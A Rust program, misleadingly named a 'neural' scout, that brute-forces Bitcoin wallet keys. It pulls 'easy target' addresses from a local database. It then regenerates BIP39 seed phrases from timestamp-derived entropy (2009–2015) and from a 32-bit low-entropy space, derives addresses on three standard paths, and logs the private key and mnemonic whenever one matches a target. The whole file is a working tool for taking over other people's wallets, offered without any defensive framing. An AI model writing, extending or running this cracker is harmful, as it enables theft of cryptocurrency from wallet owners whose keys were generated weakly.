use anyhow::Result;
use bitcoin::bip32::{DerivationPath, ExtendedPrivKey};
use bitcoin::network::constants::Network;
use bitcoin::{Address, PublicKey, secp256k1::Secp256k1};
use bip39::Mnemonic;
use rusqlite::{params, Connection};
use std::collections::HashSet;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, RwLock};
use std::time::Duration;
use sysinfo::System;
use rayon::prelude::*;

const DB_FILE: &str = "cryscout.db";

struct NeuralGenerator {
    targets: RwLock<HashSet<String>>,
    checked_count: AtomicU64,
}

fn load_easy_targets() -> Result<HashSet<String>> {
    let conn = Connection::open(DB_FILE)?;
    let _ = conn.pragma_update(None, "busy_timeout", &30000);
    let mut stmt = conn.prepare("SELECT address FROM addresses WHERE vulnerability_score > 5.0")?;
    let rows = stmt.query_map([], |row| row.get::<_, String>(0))?;
    let mut targets = HashSet::new();
    for row in rows {
        targets.insert(row?);
    }
    println!("Loaded {} 'Easy' targets for neural scouting.", targets.len());
    Ok(targets)
}

fn log_hit(mnemonic: &str, path: &str, address: &str, privkey: &str) -> Result<()> {
    let conn = Connection::open(DB_FILE)?;
    let _ = conn.pragma_update(None, "busy_timeout", &30000);
    conn.execute(
        "INSERT OR IGNORE INTO recovered_keys (address, privkey_hex, method, found_at) VALUES (?1, ?2, ?3, datetime('now'))",
        params![address, privkey, format!("NeuralScout: {}", path)],
    )?;
    println!("\n[!!!] NEURAL HIT! Address: {}, Path: {}, Mnemonic: {}", address, path, mnemonic);
    Ok(())
}

fn maybe_throttle_for_system_load() {
    let mut system = System::new_all();
    system.refresh_cpu_usage();
    system.refresh_memory();
    let cpu = system.global_cpu_info().cpu_usage();
    let ram = (system.used_memory() as f64 / system.total_memory() as f64) * 100.0;
    let delay = if cpu > 90.0 || ram > 92.0 {
        Duration::from_secs(8)
    } else if cpu > 80.0 || ram > 85.0 {
        Duration::from_secs(3)
    } else {
        Duration::from_secs(0)
    };

    if !delay.is_zero() {
        std::thread::sleep(delay);
    }
}

fn main() -> Result<()> {
    let _ = rayon::ThreadPoolBuilder::new().num_threads(1).build_global();
    let secp = Arc::new(Secp256k1::new());
    let network = Network::Bitcoin;
    let paths = vec!["m/44'/0'/0'/0/0", "m/49'/0'/0'/0/0", "m/84'/0'/0'/0/0"];
    let parsed_paths: Arc<Vec<(DerivationPath, &str)>> =
        Arc::new(paths.into_iter().map(|p| (p.parse().unwrap(), p)).collect());
    let initial_targets = load_easy_targets().unwrap_or_default();
    let gen = Arc::new(NeuralGenerator {
        targets: RwLock::new(initial_targets),
        checked_count: AtomicU64::new(0),
    });

    let gen_monitor = Arc::clone(&gen);
    std::thread::spawn(move || {
        let conn = match Connection::open(DB_FILE) {
            Ok(c) => c,
            Err(_) => return,
        };
        let _ = conn.pragma_update(None, "busy_timeout", &30000);
        loop {
            std::thread::sleep(Duration::from_secs(60));
            let current_count = gen_monitor.checked_count.load(Ordering::Relaxed);
            let target_count = gen_monitor.targets.read().map(|t| t.len()).unwrap_or(0);
            let task_msg = if target_count == 0 {
                "Neural scout idle".to_string()
            } else {
                format!("Neural Scouting ({} checked, {} targets)", current_count, target_count)
            };
            let _ = conn.execute(
                "INSERT OR REPLACE INTO worker_status (worker_id, task, cpu_usage, ram_usage, last_heartbeat)
                 VALUES (?1, ?2, ?3, ?4, datetime('now'))",
                params![format!("NeuralScout-{}", std::process::id()), task_msg, 0.0, 0.0],
            );
        }
    });

    let gen_refresh = Arc::clone(&gen);
    std::thread::spawn(move || loop {
        std::thread::sleep(Duration::from_secs(60));
        match load_easy_targets() {
            Ok(targets) => {
                if let Ok(mut current) = gen_refresh.targets.write() {
                    *current = targets;
                }
            }
            Err(e) => eprintln!("[NeuralScout Refresh] DB Error: {}", e),
        }
    });

    println!("Starting Neural Autocorrect Scouting...");

    let eras = vec![
        (1230768000, 1356998400),
        (1356998400, 1420070400),
    ];

    for (start, end) in eras {
        maybe_throttle_for_system_load();
        println!("Scanning Era: {} to {}", start, end);
        let gen_scan = Arc::clone(&gen);
        let secp_scan = Arc::clone(&secp);
        let parsed_paths_scan = Arc::clone(&parsed_paths);
        (start..end).into_par_iter().step_by(100).for_each(move |base_ts| {
            for ts in base_ts..base_ts + 100 {
                let mut entropy = [0u8; 16];
                let ts_bytes = (ts as u32).to_be_bytes();
                for i in 0..4 {
                    entropy[i * 4..(i + 1) * 4].copy_from_slice(&ts_bytes);
                }

                if let Ok(mnemonic) = Mnemonic::from_entropy(&entropy) {
                    let seed = mnemonic.to_seed("");
                    let root = ExtendedPrivKey::new_master(network, &seed).unwrap();

                    for (path, path_str) in parsed_paths_scan.iter() {
                        let derived = root.derive_priv(&secp_scan, path).unwrap();
                        let secret_key = derived.private_key;
                        let pubkey = PublicKey::new(secret_key.public_key(&secp_scan));

                        let address = if path_str.contains("44'") {
                            Address::p2pkh(&pubkey, network)
                        } else if path_str.contains("49'") {
                            Address::p2shwpkh(&pubkey, network).expect("P2SH")
                        } else {
                            Address::p2wpkh(&pubkey, network).expect("P2WPKH")
                        };

                        let is_target = gen_scan
                            .targets
                            .read()
                            .map(|targets| targets.contains(&address.to_string()))
                            .unwrap_or(false);
                        if is_target {
                            let phrase = mnemonic.to_string();
                            let _ = log_hit(&phrase, path_str, &address.to_string(), &hex::encode(secret_key.secret_bytes()));
                        }
                    }
                }
            }
            gen_scan.checked_count.fetch_add(100, Ordering::Relaxed);
        });
    }

    println!("Scanning Strategy: Low-Entropy Buffer (32-bit space)...");
    let gen_scan = Arc::clone(&gen);
    let secp_scan = Arc::clone(&secp);
    let parsed_paths_scan = Arc::clone(&parsed_paths);
    (0..u32::MAX).into_par_iter().step_by(1000).for_each(move |base| {
        if base % 100000 == 0 {
            maybe_throttle_for_system_load();
        }
        for i in 0..1000 {
            let val = base + i;
            let mut entropy = [0u8; 16];
            let bytes = val.to_le_bytes();
            entropy[0..4].copy_from_slice(&bytes);

            if let Ok(mnemonic) = Mnemonic::from_entropy(&entropy) {
                let seed = mnemonic.to_seed("");
                let root = ExtendedPrivKey::new_master(network, &seed).unwrap();
                for (path, path_str) in parsed_paths_scan.iter() {
                    let derived = root.derive_priv(&secp_scan, path).unwrap();
                    let secret_key = derived.private_key;
                    let pubkey = PublicKey::new(secret_key.public_key(&secp_scan));

                    let address = if path_str.contains("44'") {
                        Address::p2pkh(&pubkey, network)
                    } else if path_str.contains("49'") {
                        Address::p2shwpkh(&pubkey, network).expect("P2SH")
                    } else {
                        Address::p2wpkh(&pubkey, network).expect("P2WPKH")
                    };

                    let is_target = gen_scan
                        .targets
                        .read()
                        .map(|targets| targets.contains(&address.to_string()))
                        .unwrap_or(false);
                    if is_target {
                        let phrase = mnemonic.to_string();
                        let _ = log_hit(&phrase, path_str, &address.to_string(), &hex::encode(secret_key.secret_bytes()));
                    }
                }
            }
        }
        if base % 1000000 == 0 {
            println!("[NeuralScout] Checked {} low-entropy combinations...", base);
        }
    });

    Ok(())
}
